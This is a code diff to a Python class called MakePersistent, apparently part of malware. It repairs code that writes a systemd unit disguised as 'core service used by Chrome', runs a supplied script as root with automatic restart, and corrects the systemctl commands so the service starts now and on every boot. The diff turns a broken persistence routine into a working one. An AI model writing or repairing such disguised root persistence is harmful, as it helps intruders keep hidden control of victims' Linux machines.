@@ -16,8 +16,7 @@ class MakePersistent:
     @staticmethod
     def create_service_file_content(file_path):
 
-        service_file_content = f"""[Unit]\nDescription=This is core service used by Chrome\n[
-        Service]\nUser=root\nExecStart={file_path}\nRestart=always\n[Install]\nWantedBy=multi-user.target\n """
+        service_file_content = f"""[Unit]\nDescription=This is core service used by Chrome\n[Service]\nUser=root\nExecStart=/bin/bash {file_path}\nRestart=always\n[Install]\nWantedBy=multi-user.target\n """
 
         return service_file_content
 
@@ -34,10 +33,10 @@ class MakePersistent:
                 system("sudo systemctl daemon-reload")
 
                 # start service
-                system(f"sudo systemctl {service_name}.service")
+                system(f"sudo systemctl start {service_name}.service")
 
                 # enable on boot
-                system(f"sudo systemctl {service_name}.service")
+                system(f"sudo systemctl enable {service_name}.service")
 
                 service_files.append(f"/etc/systemd/system/{service_name}.service")
 
